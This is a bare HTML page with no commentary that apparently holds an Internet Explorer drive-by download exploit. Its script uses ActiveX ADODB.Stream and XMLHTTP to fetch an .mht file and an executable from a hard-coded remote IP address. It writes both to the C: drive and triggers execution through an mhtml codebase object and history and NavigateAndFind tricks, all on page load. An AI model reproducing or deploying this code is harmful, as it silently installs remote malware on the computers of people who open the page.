<html><body><script>
function payload(){var o=new ActiveXObject("ADODB.Stream");o.Open();o.Type=2;o.Charset="ascii";o.WriteText('<html><body onload="window.close()"><object classid="clsid:11111111-1111-1111-1111-111111111111" codebase="mhtml:file://c:/x.mht!file:///c:/pl.exe"></object></body></html>');o.SaveToFile("c:\\x.htm",2);o.Close();var x=new ActiveXObject("Microsoft.XMLHTTP");x.Open("GET","http://66.117.38.54:80/iex/x.mht?xdat=12463&url=http://66.117.38.54:80/dexSE534.exe",0);x.Send();var l=new ActiveXObject("ADODB.Stream");l.Mode=3;l.Type=1;l.Open();l.Write(x.responseBody);l.SaveToFile("c:\\x.mht",2);l.Close();external.NavigateAndFind("file://c:/x.htm",'','');}
function trigger(len){if(history.length!=len)payload();else{opener.sig();return "<title>-</title><body onload=external.NavigateAndFind('res:','','')>";}}
function backbutton(){location='javascript:'+trigger+payload+'trigger('+history.length+')';}backbutton();
</script></body></html>
